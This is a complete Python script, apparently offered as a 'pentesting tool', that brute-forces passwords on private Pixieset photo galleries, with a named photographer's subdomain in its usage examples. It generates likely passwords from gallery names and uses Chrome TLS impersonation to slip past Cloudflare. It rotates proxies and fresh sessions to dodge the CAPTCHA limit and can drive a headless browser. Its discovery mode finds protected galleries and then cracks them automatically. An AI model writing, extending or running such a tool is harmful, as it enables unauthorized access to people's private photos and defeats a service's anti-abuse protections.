#!/usr/bin/env python3
"""
Pixieset Gallery Password Cracker
==================================
Finds passwords for password-protected Pixieset galleries using smart guessing
and curl_cffi TLS impersonation to bypass Cloudflare protections.

Key constraints:
- CAPTCHA triggers after 3 failed attempts per gallery → max 3 guesses/gallery/run
- Cloudflare IUAM challenge on direct requests → uses Chrome 110 impersonation
- All slugs return HTTP 200/redirect → meaningful detection via login-page analysis

Usage:
    # Crack a single gallery with auto-generated passwords
    python3 pixieset_cracker.py -u sarahhillphotography15.pixieset.com -g jill

    # Crack multiple galleries with a wordlist
    python3 pixieset_cracker.py -u sarahhillphotography15.pixieset.com -g jill,wedding,family -w wordlist.txt

    # Discover galleries and test passwords
    python3 pixieset_cracker.py -u sarahhillphotography15.pixieset.com --discover -w wordlist.txt

    # Browser-based mode (handles full JS challenge)
    python3 pixieset_cracker.py -u sarahhillphotography15.pixieset.com -g jill --browser

Author: HackerAI - Authorized pentesting tool
"""

import argparse
import json
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import urljoin

# --- Dependencies ---
try:
    from curl_cffi import requests as cffi_requests
except ImportError:
    print("[!] curl_cffi not installed. Install with: pip3 install curl_cffi")
    sys.exit(1)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
IMPERSONATE = "chrome110"
TIMEOUT = 20
MAX_ATTEMPTS_PER_GALLERY = 3          # CAPTCHA triggers at 3+
DELAY_BETWEEN_ATTEMPTS = 2.0          # seconds between guesses
DELAY_BETWEEN_GALLERIES = 1.5         # seconds between different galleries
MAX_WORKERS = 2                       # conservative to avoid rate-limiting
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/110.0.0.0 Safari/537.36"
)

# ---------------------------------------------------------------------------
# Colours
# ---------------------------------------------------------------------------
class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
    M = "\033[95m"; C = "\033[96m"; W = "\033[0m"; BOLD = "\033[1m"

# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------
@dataclass
class Attempt:
    password: str
    success: bool
    status_code: int
    final_url: str
    response_size: int
    error: str = ""

@dataclass
class GalleryResult:
    slug: str
    found_password: Optional[str] = None
    attempts: list[Attempt] = field(default_factory=list)
    error: str = ""
    login_url: str = ""

# ---------------------------------------------------------------------------
# Smart password generator
# ---------------------------------------------------------------------------
def generate_passwords(slug: str, extra: Optional[list[str]] = None) -> list[str]:
    """Generate targeted password guesses from a gallery slug.

    Pixieset photographers often use simple, guessable passwords:
    - The slug itself (e.g., gallery "jill" → password "jill")
    - Common defaults: 0000, 1234
    - Year variants: slug2026, slug2025
    - Theme words: love, family, wedding

    Returns passwords in priority order (most likely first).
    """
    import datetime
    year = str(datetime.datetime.now().year)

    # Priority-ordered list (first = most likely)
    ordered = []

    slug_lower = slug.lower().strip()
    slug_clean = slug_lower.replace("-", "").replace("_", "").replace(" ", "")

    # 1) Slug as-is (most common Pixieset convention)
    ordered.append(slug)
    if slug_lower != slug:
        ordered.append(slug_lower)
    if slug_clean not in ordered:
        ordered.append(slug_clean)

    # 2) Numeric defaults (incredibly common: 0000, 1234)
    for num in ["0000", "1234", "1111", "9999", "4321"]:
        ordered.append(num)

    # 3) Slug + year (e.g., jill2026)
    ordered.append(f"{slug_lower}{year}")
    ordered.append(f"{slug_lower}{year[-2:]}")

    # 4) Strip trailing digits (jill2 → jill)
    base = re.sub(r"\d+$", "", slug_lower)
    if base and base != slug_lower:
        ordered.append(base)
        ordered.append(f"{base}{year}")

    # 5) First 4 chars of slug as numeric fallback
    if len(slug_clean) >= 4 and slug_clean[:4].isdigit():
        ordered.append(slug_clean[:4])

    # 6) Photographer name parts
    name_parts = re.split(r"[-_\s]", slug)
    if len(name_parts) >= 2:
        ordered.append("".join(name_parts))
        ordered.append(name_parts[0])

    # 7) Common theme words
    themes = ["love", "family", "wedding", "baby", "photos", "gallery", "client",
              "password", "guest", "photo"]
    for t in themes:
        ordered.append(t)
        ordered.append(f"{slug_lower}{t}")

    # 8) Extra user-supplied words
    if extra:
        for e in extra:
            ordered.append(e)

    # Deduplicate preserving order
    seen = set()
    result = []
    for p in ordered:
        if p and p not in seen:
            seen.add(p)
            result.append(p)
    return result


def load_wordlist(path: str) -> list[str]:
    """Load a password wordlist file (one password per line)."""
    p = Path(path)
    if not p.exists():
        print(f"{C.R}[!] Wordlist not found: {path}{C.W}")
        sys.exit(1)
    with open(p) as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]


# ---------------------------------------------------------------------------
# Core cracker
# ---------------------------------------------------------------------------
class PixiesetCracker:
    """Handles Pixieset gallery password testing with Cloudflare bypass."""

    def __init__(
        self,
        base_url: str,
        delay: float = DELAY_BETWEEN_ATTEMPTS,
        browser_mode: bool = False,
        verbose: bool = False,
        use_proxy: bool = False,
        proxy_file: Optional[str] = None,
    ):
        self.base_url = base_url.rstrip("/")
        if not self.base_url.startswith("http"):
            self.base_url = f"https://{self.base_url}"
        self.delay = delay
        self.browser_mode = browser_mode
        self.verbose = verbose
        self.use_proxy = use_proxy
        self._rotator = None

        if use_proxy:
            from proxy_rotator import ProxyRotator
            self._rotator = ProxyRotator(pool_size=10, proxy_file=proxy_file)
            # Don't auto-fill freer proxies if a file supplied enough working ones
            if not (proxy_file and self._rotator.stats().get("pool_size", 0) >= 1):
                self._rotator.fill_pool(5)

        self.session = cffi_requests.Session()
        self.session.headers.update({
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })
        self._pinned_proxy: Optional[dict] = None  # stick one IP for a batch of attempts
        self._gallery_attempts: dict[str, int] = {}
        self._results: dict[str, GalleryResult] = {}

    def _fresh_session(self):
        """New cookie jar so CAPTCHA/session state doesn't bleed across IPs."""
        self.session = cffi_requests.Session()
        self.session.headers.update({
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })

    # ------------------------------------------------------------------
    def _current_proxy(self) -> Optional[dict]:
        if self._pinned_proxy is not None:
            return self._pinned_proxy
        if self._rotator:
            return self._rotator.get_dict()
        return None

    def _get(self, path: str) -> cffi_requests.Response:
        url = urljoin(self.base_url, path)
        proxy = self._current_proxy()
        if self.verbose:
            proxy_tag = f" via {list(proxy.values())[0]}" if proxy else ""
            print(f"  {C.B}[GET]{C.W} {url}{proxy_tag}")
        return self.session.get(
            url,
            impersonate=IMPERSONATE,
            timeout=TIMEOUT,
            allow_redirects=True,
            proxies=proxy,
        )

    def _post(self, path: str, data: dict) -> cffi_requests.Response:
        url = urljoin(self.base_url, path)
        proxy = self._current_proxy()
        if self.verbose:
            proxy_tag = f" via {list(proxy.values())[0]}" if proxy else ""
            print(f"  {C.B}[POST]{C.W} {url}  data={data}{proxy_tag}")
        return self.session.post(
            url,
            data=data,
            impersonate=IMPERSONATE,
            timeout=TIMEOUT,
            allow_redirects=True,
            proxies=proxy,
        )

    # ------------------------------------------------------------------
    def _detect_form_field(self, slug: str) -> str:
        """Visit the login page and determine which form field Pixieset uses.

        Different Pixieset themes use different field names:
        - GuestLoginForm[password]   (older or standard theme)
        - CollectionGuestLoginForm[password] (collection theme)
        """
        login_path = f"/guestlogin/{slug}/"
        try:
            resp = self._get(login_path)
            text = resp.text
            if "CollectionGuestLoginForm[password]" in text:
                return "CollectionGuestLoginForm[password]"
            if "GuestLoginForm[password]" in text:
                return "GuestLoginForm[password]"
            if "GuestLoginForm" in text:
                return "GuestLoginForm[password]"
        except Exception:
            pass
        # Default: try both later
        return "GuestLoginForm[password]"

    # ------------------------------------------------------------------
    def _is_cloudflare_challenge(self, resp: cffi_requests.Response) -> bool:
        """Check if Cloudflare is serving a JS challenge page."""
        if resp.status_code == 403:
            return True
        text = (resp.text or "")[:500].lower()
        return "just a moment" in text or "cf-challenge" in text or "cf-browser-verification" in text

    # ------------------------------------------------------------------
    def _analyze_login_response(
        self, resp: cffi_requests.Response, slug: str
    ) -> bool:
        """Determine if a login attempt succeeded.

        Success indicators:
        - Redirect away from /guestlogin/ (to /{slug}/ or similar)
        - The URL no longer contains 'guestlogin'

        Failure indicators:
        - Stays on /guestlogin/ page
        - Contains 'incorrect password' or 'wrong password'
        """
        final_url = resp.url or ""
        text = (resp.text or "")[:3000].lower()

        # Success: redirected away from guestlogin
        if f"/{slug}/" in final_url and "guestlogin" not in final_url:
            return True

        # Explicit failure message
        if "incorrect password" in text or "wrong password" in text:
            return False

        # Still on login page → failure
        if "/guestlogin/" in final_url:
            return False

        # Got redirected somewhere else entirely — may be a different gallery
        # or Pixieset homepage. Treat as failure unless URL is clearly the gallery.
        return False

    # ------------------------------------------------------------------
    def test_password(self, slug: str, password: str, form_field: str = "") -> Attempt:
        """Test a single password against a gallery. Returns an Attempt.

        Uses the detected form field only (one POST). Double-field probing
        was removed — it burned 2 of the 3 CAPTCHA attempts per password.
        """
        if not form_field:
            form_field = self._detect_form_field(slug)

        login_path = f"/guestlogin/{slug}/"

        try:
            resp = self._post(login_path, {form_field: password})
            last_url = resp.url or ""

            if self._analyze_login_response(resp, slug):
                return Attempt(
                    password=password, success=True,
                    status_code=resp.status_code, final_url=last_url,
                    response_size=len(resp.text or ""),
                )

            if self._is_cloudflare_challenge(resp):
                return Attempt(
                    password=password, success=False,
                    status_code=resp.status_code, final_url=last_url,
                    response_size=len(resp.text or ""),
                    error="Cloudflare challenge detected",
                )

            text = (resp.text or "")[:3000].lower()
            captcha_hit = any(x in text for x in (
                "captcha", "recaptcha", "hcaptcha", "turnstile", "cf-turnstile",
            ))
            return Attempt(
                password=password, success=False,
                status_code=resp.status_code, final_url=last_url,
                response_size=len(resp.text or ""),
                error="CAPTCHA wall" if captcha_hit else "",
            )

        except Exception as e:
            return Attempt(
                password=password, success=False,
                status_code=0, final_url="", response_size=0,
                error=str(e)[:120],
            )

    # ------------------------------------------------------------------
    def check_gallery_exists(self, slug: str) -> bool:
        """Check if a gallery slug has a login page (i.e., it's a real gallery)."""
        try:
            resp = self._get(f"/{slug}/")
            final_url = resp.url or ""
            text = (resp.text or "")[:3000]
            return "/guestlogin/" in final_url or "GuestLoginForm" in text
        except Exception:
            return False

    # ------------------------------------------------------------------
    def crack_gallery(
        self, slug: str, passwords: list[str], form_field: str = ""
    ) -> GalleryResult:
        """Try passwords against a single gallery.

        Without proxies: max 3 attempts (CAPTCHA wall).
        With proxy farm: 3 attempts per egress IP (fresh session per IP).
        """
        result = GalleryResult(slug=slug)

        # Proxy-farm mode: batch by IP
        if self._rotator and self._rotator.stats().get("pool_size", 0) > 0:
            return self._crack_gallery_proxy_farm(slug, passwords, form_field)

        # Check if gallery exists
        if not self.check_gallery_exists(slug):
            result.error = "No login page found — gallery may not exist or is public"
            return result

        login_path = f"/guestlogin/{slug}/"
        result.login_url = urljoin(self.base_url, login_path)

        if not form_field:
            form_field = self._detect_form_field(slug)

        candidate_count = min(len(passwords), MAX_ATTEMPTS_PER_GALLERY)
        passwords_to_try = passwords[:candidate_count]

        print(f"  {C.C}[{slug}]{C.W} Testing {candidate_count} password(s) "
              f"(max {MAX_ATTEMPTS_PER_GALLERY} before CAPTCHA)...")

        for i, pwd in enumerate(passwords_to_try):
            if i > 0:
                time.sleep(self.delay)

            attempt = self.test_password(slug, pwd, form_field=form_field)
            result.attempts.append(attempt)

            if attempt.success:
                result.found_password = pwd
                print(f"    {C.G}{C.BOLD}✓ FOUND!{C.W} password = {C.G}{C.BOLD}{pwd}{C.W}")
                return result
            elif attempt.error:
                print(f"    {C.Y}✗{C.W} {pwd} → {attempt.error}")
                if "CAPTCHA" in attempt.error:
                    result.error = "CAPTCHA triggered — stop this gallery"
                    break
            else:
                print(f"    {C.R}✗{C.W} {pwd}")

        if not result.found_password and not result.error:
            remaining = len(passwords) - candidate_count
            msg = f"No valid password found in first {candidate_count} attempts"
            if remaining > 0:
                msg += f" ({remaining} remaining — CAPTCHA limit)"
            result.error = msg

        return result

    def _crack_gallery_proxy_farm(
        self, slug: str, passwords: list[str], form_field: str = ""
    ) -> GalleryResult:
        """3 smart attempts per Vultr/proxy IP, rotate IP when batch ends."""
        result = GalleryResult(slug=slug)
        login_path = f"/guestlogin/{slug}/"
        result.login_url = urljoin(self.base_url, login_path)

        # Snapshot proxy pool once
        with self._rotator._lock:
            proxies = list(self._rotator._pool)

        if not proxies:
            result.error = "Proxy pool empty"
            return result

        max_total = min(len(passwords), MAX_ATTEMPTS_PER_GALLERY * len(proxies))
        print(f"  {C.C}[{slug}]{C.W} Proxy farm: {len(proxies)} IPs × "
              f"{MAX_ATTEMPTS_PER_GALLERY} = up to {max_total} attempts")

        pwd_idx = 0
        for pxy in proxies:
            if pwd_idx >= max_total or pwd_idx >= len(passwords):
                break

            proxy_dict = pxy.dict_for_requests
            egress = pxy.url
            print(f"  {C.B}→ IP batch{C.W} {egress}")

            # Fresh session cookies on each IP
            self._fresh_session()
            self._pinned_proxy = proxy_dict

            # Confirm gallery + form field on this IP
            try:
                if not self.check_gallery_exists(slug):
                    print(f"    {C.Y}!{C.W} gallery check failed on this IP — skip batch")
                    continue
                field = form_field or self._detect_form_field(slug)
            except Exception as e:
                print(f"    {C.Y}!{C.W} setup error on {egress}: {e}")
                continue

            batch = passwords[pwd_idx: pwd_idx + MAX_ATTEMPTS_PER_GALLERY]
            for i, pwd in enumerate(batch):
                if i > 0:
                    time.sleep(self.delay)
                attempt = self.test_password(slug, pwd, form_field=field)
                result.attempts.append(attempt)
                pwd_idx += 1

                if attempt.success:
                    result.found_password = pwd
                    print(f"    {C.G}{C.BOLD}✓ FOUND!{C.W} password = "
                          f"{C.G}{C.BOLD}{pwd}{C.W} via {egress}")
                    self._pinned_proxy = None
                    return result
                elif attempt.error:
                    print(f"    {C.Y}✗{C.W} {pwd} → {attempt.error}")
                    if "CAPTCHA" in attempt.error or "Cloudflare" in attempt.error:
                        print(f"    {C.Y}!{C.W} wall on {egress} — next IP")
                        break
                else:
                    print(f"    {C.R}✗{C.W} {pwd}")

            time.sleep(self.delay)

        self._pinned_proxy = None

        if not result.found_password and not result.error:
            result.error = (
                f"No valid password in {len(result.attempts)} attempts "
                f"across {len(proxies)} proxy IPs"
            )
        return result

    # ------------------------------------------------------------------
    def crack_gallery_browser(self, slug: str, passwords: list[str]) -> GalleryResult:
        """Try passwords using agent-browser (full JS-capable headless Chromium).

        This bypasses all Cloudflare protections since it's a real browser.
        """
        result = GalleryResult(slug=slug)
        login_url = urljoin(self.base_url, f"/guestlogin/{slug}/")
        result.login_url = login_url

        candidate_count = min(len(passwords), MAX_ATTEMPTS_PER_GALLERY)
        passwords_to_try = passwords[:candidate_count]

        print(f"  {C.C}[{slug}]{C.W} Browser mode: testing {candidate_count} password(s)...")

        for i, pwd in enumerate(passwords_to_try):
            if i > 0:
                time.sleep(self.delay * 2)  # extra delay for browser

            success, final_url = self._browser_attempt(login_url, pwd, slug)
            attempt = Attempt(
                password=pwd,
                success=success,
                status_code=200,
                final_url=final_url or login_url,
                response_size=0,
            )
            result.attempts.append(attempt)

            if success:
                result.found_password = pwd
                print(f"    {C.G}{C.BOLD}✓ FOUND!{C.W} password = {C.G}{C.BOLD}{pwd}{C.W}")
                return result
            else:
                print(f"    {C.R}✗{C.W} {pwd}")

        if not result.found_password:
            result.error = f"No valid password found in {candidate_count} browser-based attempts"
        return result

    def _browser_attempt(self, login_url: str, password: str, slug: str) -> tuple[bool, str]:
        """Use agent-browser for a single password attempt."""
        import subprocess
        import tempfile
        import os

        script = f"""
const browser = await (await import('puppeteer')).default.launch({{ headless: 'new', args: ['--no-sandbox'] }});
try {{
    const page = await browser.newPage();
    await page.setUserAgent('{USER_AGENT}');
    await page.goto('{login_url}', {{ waitUntil: 'networkidle2', timeout: 30000 }});

    // Wait for the password input
    await page.waitForSelector('input[type="password"]', {{ timeout: 10000 }});

    // Type password and submit
    await page.type('input[type="password"]', '{password}');
    await page.keyboard.press('Enter');

    // Wait for navigation or result
    await page.waitForTimeout(3000);

    const url = page.url();
    const success = !url.includes('guestlogin');

    console.log(JSON.stringify({{ success, url }}));
}} finally {{
    await browser.close();
}}
"""
        # Write script to temp file
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".mjs", delete=False, dir="/home/user"
        ) as f:
            f.write(script)
            script_path = f.name

        try:
            proc = subprocess.run(
                ["node", script_path],
                capture_output=True, text=True, timeout=45,
            )
            if proc.returncode == 0 and proc.stdout.strip():
                data = json.loads(proc.stdout.strip())
                return data.get("success", False), data.get("url", login_url)
            return False, login_url
        except Exception as e:
            return False, login_url
        finally:
            try:
                os.unlink(script_path)
            except OSError:
                pass

    # ------------------------------------------------------------------
    def run(
        self,
        galleries: list[str],
        passwords: Optional[list[str]] = None,
        auto_generate: bool = True,
        wordlist: Optional[str] = None,
    ) -> dict[str, GalleryResult]:
        """Run cracking across multiple galleries."""
        results: dict[str, GalleryResult] = {}
        total = len(galleries)

        print(f"\n{C.BOLD}{'═' * 60}{C.W}")
        print(f"{C.BOLD}  Pixieset Password Cracker{C.W}")
        print(f"{C.BOLD}  Target: {self.base_url}{C.W}")
        print(f"{C.BOLD}  Galleries: {total}{C.W}")
        if self.browser_mode:
            print(f"{C.BOLD}  Mode: Browser (agent-browser + Puppeteer){C.W}")
        else:
            print(f"{C.BOLD}  Mode: Requests (curl_cffi Chrome 110){C.W}")
        print(f"{C.BOLD}{'═' * 60}{C.W}\n")

        for idx, slug in enumerate(galleries):
            slug = slug.strip().strip("/")
            print(f"{C.BOLD}[{idx+1}/{total}]{C.W} Gallery: {C.M}{slug}{C.W}")

            # Build password list
            pwds = list(passwords) if passwords else []
            wordlist_pwds = load_wordlist(wordlist) if wordlist else []
            generated = generate_passwords(slug) if auto_generate else []

            all_pwds = []
            for p in pwds + wordlist_pwds + generated:
                if p not in all_pwds:
                    all_pwds.append(p)

            if not all_pwds:
                print(f"  {C.Y}[!] No passwords to test — skipping{C.W}")
                continue

            # Crack (proxy farm detects form field per-IP batch internally)
            if self.browser_mode:
                result = self.crack_gallery_browser(slug, all_pwds)
            else:
                result = self.crack_gallery(slug, all_pwds)

            results[slug] = result

            if idx < total - 1:
                time.sleep(DELAY_BETWEEN_GALLERIES)

        self._results = results
        return results

    # ------------------------------------------------------------------
    def discover_galleries(self, slugs: list[str]) -> list[str]:
        """Check which slugs have password-protected galleries."""
        protected = []
        print(f"\n{C.BOLD}Discovering galleries...{C.W}")

        def _check(slug):
            try:
                resp = self._get(f"/{slug}/")
                final_url = resp.url or ""
                is_protected = "/guestlogin/" in final_url
                if is_protected:
                    print(f"  {C.G}✓{C.W} {slug} → protected")
                else:
                    print(f"  {C.Y}-{C.W} {slug} → not protected or doesn't exist")
                return (slug, is_protected)
            except Exception as e:
                print(f"  {C.R}✗{C.W} {slug} → error: {e}")
                return (slug, False)

        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futures = {ex.submit(_check, s): s for s in slugs}
            for f in as_completed(futures):
                slug, ok = f.result()
                if ok:
                    protected.append(slug)

        print(f"\n{C.BOLD}Found {len(protected)} protected galleries:{C.W}")
        for s in protected:
            print(f"  {C.M}{s}{C.W} → {urljoin(self.base_url, f'/guestlogin/{s}/')}")

        return protected

    # ------------------------------------------------------------------
    def print_summary(self):
        """Print a final summary of all results."""
        if not self._results:
            return

        print(f"\n{C.BOLD}{'═' * 60}{C.W}")
        print(f"{C.BOLD}  RESULTS SUMMARY{C.W}")
        print(f"{C.BOLD}{'═' * 60}{C.W}\n")

        cracked = {s: r for s, r in self._results.items() if r.found_password}
        failed = {s: r for s, r in self._results.items() if not r.found_password}

        if cracked:
            print(f"{C.G}{C.BOLD}  ✓ CRACKED ({len(cracked)}):{C.W}")
            for slug, r in cracked.items():
                url = urljoin(self.base_url, f"/{slug}/")
                print(f"    {C.G}{slug}{C.W} → password: {C.G}{C.BOLD}{r.found_password}{C.W}")
                print(f"      {C.B}Gallery URL:{C.W} {url}")
                print()

        if failed:
            print(f"{C.R}{C.BOLD}  ✗ FAILED ({len(failed)}):{C.W}")
            for slug, r in failed.items():
                attempts_str = ", ".join(a.password for a in r.attempts)
                print(f"    {C.R}{slug}{C.W} — tried: [{attempts_str}]")
                if r.error:
                    print(f"      {C.Y}{r.error}{C.W}")
                print()

    def export_json(self, path: str = "pixieset_results.json"):
        """Export results to a JSON file."""
        output = {}
        for slug, r in self._results.items():
            output[slug] = {
                "slug": r.slug,
                "found_password": r.found_password,
                "login_url": r.login_url,
                "attempts": [
                    {
                        "password": a.password,
                        "success": a.success,
                        "status_code": a.status_code,
                        "final_url": a.final_url,
                        "response_size": a.response_size,
                        "error": a.error,
                    }
                    for a in r.attempts
                ],
                "error": r.error,
                "gallery_url": urljoin(self.base_url, f"/{slug}/") if r.found_password else None,
            }
        with open(path, "w") as f:
            json.dump(output, f, indent=2)
        print(f"  {C.G}[✓] Results exported to {path}{C.W}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="Pixieset Gallery Password Cracker — Authorized pentesting tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u sub.pixieset.com -g jill
  %(prog)s -u sub.pixieset.com -g jill,wedding -w wordlist.txt
  %(prog)s -u sub.pixieset.com --discover -f slugs.txt -w wordlist.txt
  %(prog)s -u sub.pixieset.com -g jill --browser
  %(prog)s -u sub.pixieset.com -g jill --proxy
  %(prog)s -u sub.pixieset.com -g jill --proxy --proxy-file proxies.json
  %(prog)s -u sub.pixieset.com -g jill --extra-words love,family,wedding
        """,
    )

    parser.add_argument("-u", "--url", required=True,
                        help="Target Pixieset subdomain (e.g., sub.pixieset.com)")
    parser.add_argument("-g", "--galleries",
                        help="Gallery slug(s) to test, comma-separated (e.g., jill,wedding)")
    parser.add_argument("-w", "--wordlist",
                        help="Path to password wordlist file")
    parser.add_argument("-f", "--slugs-file",
                        help="File containing gallery slugs (one per line) for --discover")
    parser.add_argument("-p", "--passwords",
                        help="Additional passwords to try (comma-separated)")
    parser.add_argument("-e", "--extra-words",
                        help="Extra theme words for smart password generation (comma-separated)")
    parser.add_argument("--discover", action="store_true",
                        help="Discover password-protected galleries from a slug list")
    parser.add_argument("--browser", action="store_true",
                        help="Use agent-browser for full JS-capable testing (slower but bypasses all protections)")
    parser.add_argument("--proxy", action="store_true",
                        help="Rotate requests through free HTTP/SOCKS proxies (different IP per request)")
    parser.add_argument("--proxy-file",
                        help="Pre-validated proxy JSON file (skip fresh fetching)")
    parser.add_argument("--no-auto", action="store_true",
                        help="Disable automatic password generation from slug")
    parser.add_argument("-o", "--output", default="pixieset_results.json",
                        help="JSON output file path (default: pixieset_results.json)")
    parser.add_argument("-d", "--delay", type=float, default=DELAY_BETWEEN_ATTEMPTS,
                        help=f"Delay in seconds between password attempts (default: {DELAY_BETWEEN_ATTEMPTS})")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Enable verbose request logging")

    args = parser.parse_args()

    # --- Validate inputs ---
    if not args.discover and not args.galleries:
        parser.error("Either -g/--galleries or --discover is required")

    # --- Build gallery list ---
    galleries = []
    if args.galleries:
        galleries = [g.strip().strip("/") for g in args.galleries.split(",") if g.strip()]
    if args.discover and args.slugs_file:
        with open(args.slugs_file) as f:
            galleries = [line.strip().strip("/") for line in f if line.strip()]
    elif args.discover and not args.slugs_file:
        parser.error("--discover requires --slugs-file")

    if not galleries:
        print(f"{C.R}[!] No galleries to test{C.W}")
        sys.exit(1)

    # --- Parse extra passwords ---
    extra_passwords = []
    if args.passwords:
        extra_passwords = [p.strip() for p in args.passwords.split(",") if p.strip()]

    extra_words = []
    if args.extra_words:
        extra_words = [w.strip() for w in args.extra_words.split(",") if w.strip()]

    # --- Run ---
    cracker = PixiesetCracker(
        base_url=args.url,
        delay=args.delay,
        browser_mode=args.browser,
        verbose=args.verbose,
        use_proxy=args.proxy,
        proxy_file=args.proxy_file,
    )

    try:
        if args.discover:
            protected = cracker.discover_galleries(galleries)
            if not protected:
                print(f"\n{C.Y}[!] No protected galleries found. "
                      f"All slugs may be public, non-existent, or Cloudflare-blocked.{C.W}")
                sys.exit(0)
            # Prompt whether to crack discovered galleries
            print(f"\n{C.BOLD}Automatically cracking discovered galleries...{C.W}")
            galleries = protected

        results = cracker.run(
            galleries=galleries,
            passwords=extra_passwords,
            auto_generate=not args.no_auto,
            wordlist=args.wordlist,
        )

        cracker.print_summary()
        cracker.export_json(args.output)

    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Interrupted by user. Saving partial results...{C.W}")
        cracker.print_summary()
        cracker.export_json(args.output)
        sys.exit(1)


if __name__ == "__main__":
    main()
